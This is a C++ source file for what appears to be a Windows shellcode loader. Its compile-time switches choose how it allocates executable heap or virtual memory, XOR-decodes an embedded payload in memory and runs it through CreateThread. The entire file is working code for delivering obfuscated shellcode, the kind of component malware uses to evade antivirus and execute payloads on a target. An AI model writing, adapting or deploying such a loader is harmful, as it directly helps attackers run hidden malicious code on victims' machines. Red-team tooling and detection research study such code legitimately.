#ifdef PAYLOAD
#include "payload.h"
#include <stdio.h>
#include <string>
#include <windows.h>

#ifdef ENC_XOR
void memxor(unsigned char* mem, std::wstring key, int size) {
    for (int i = 0; i < size ; ++i) {
        mem[i] ^= key[i % key.length()];
    }
}
#endif

int entry(int argc, char** argv) {
    LPVOID scAddr = 0;

    // Allocate memory
#ifdef ALLOC_HEAP
    HANDLE hndl = HeapCreate(
        HEAP_CREATE_ENABLE_EXECUTE, 0, sizeof(sc)
    );
    scAddr = HeapAlloc(hndl, HEAP_ZERO_MEMORY, sizeof(sc));
    if (hndl) CloseHandle(hndl);
#elifdef ALLOC_STACK
    scAddr = VirtualAlloc(
        0, sizeof(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE
    );
#else
    printf("Unsupported ALLOC provided at compile time\n");
    exit(1);
#endif

    // Check for successful allocation
    if (scAddr == 0) {
        printf("Failed to allocate memory\n");
        exit(2);
    }

    // Copy shellcode to memory
    memcpy(scAddr, sc, sizeof(sc));

#ifdef ENC_XOR
    if (sckey.length() > 0) {
        // Decode our shellcode in memory byte by byte
        memxor((unsigned char*)scAddr, sckey, sizeof(sc));
    }
#else
    printf("Unsupported ENC provided at compile time\n");
    exit(3);
#endif

    // Run payload via callback
#ifdef EXEC_THREAD
    HANDLE t = CreateThread(
        0, 0, (LPTHREAD_START_ROUTINE)scAddr, 0, 0, 0
    );
    WaitForSingleObject(t, INFINITE);
    if (t) CloseHandle(t);
#else
    printf("Unsuported EXEC provided at compile time\n");
    exit(4);
#endif

    return 0;
}
#else
#include <stdio.h>

int entry(int argc, char** argv) {
    printf("You fool...\n");
    return 0;
}
#endif
